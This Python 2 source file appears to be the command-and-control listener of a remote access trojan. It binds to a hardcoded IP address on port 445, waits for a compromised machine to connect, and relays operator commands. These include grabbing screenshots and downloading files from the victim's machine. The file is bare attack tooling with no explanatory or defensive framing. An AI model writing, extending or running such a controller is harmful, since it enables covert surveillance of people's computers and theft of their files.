import socket, os

class listener(object):
    TCP_IP = '85.255.5.44'
    PORT = 445
    BUFFER_SIZE = 4096 * 2  # Normally 1024, but we want fast response

    def start(self):
        print "Listener Started"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.bind((self.TCP_IP, self.PORT))

        s.listen(5)
        connection, address = s.accept()

        while True:
            buf = connection.recv(self.BUFFER_SIZE)
            if len(buf) > 0:
                print buf
                buf = ""
                resp = raw_input() + "\n"

                if resp == "exit\n":
                    connection.sendall("quit\n")
                    connection.close()
                    os._exit(0)
                elif resp == "screenshot\n":
                    connection.sendall(resp)
                    data = connection.recv(4096)
                    print data
                    name = data[7:-8]
                    data = ""
                    while "finish" not in data:
                        data += connection.recv(150)
                    data = data[:-7]

                    fh = open(name, "wb")
                    # fh.write(data.decode('base64'))
                    fh.write(data)
                    fh.close()

                    resp = raw_input() + "\n"
                    connection.sendall(resp)

                elif resp.startswith("download("):
                    connection.sendall(resp)
                    data = connection.recv(4096)
                    print data
                    if "does not exists" not in data:
                        name = data[12:-3]
                        data = ""
                        while "finish" not in data:
                            data += connection.recv(150)
                        data = data[:-7]

                        fh = open(name, "wb")
                        fh.write(data)
                        fh.close()
                        print name+" successfully downloaded."

                    resp = raw_input()+"\n"
                    connection.sendall(resp)

                elif resp.startswith("status"):
                        print "Listener running..."
                        resp = raw_input() + "\n"
                        connection.sendall(resp)

                else:
                    connection.sendall(resp)
            else:
                print "0"

    def setOptions(self,ipAddress,port):
        self.TCP_IP = ipAddress
        self.PORT = port
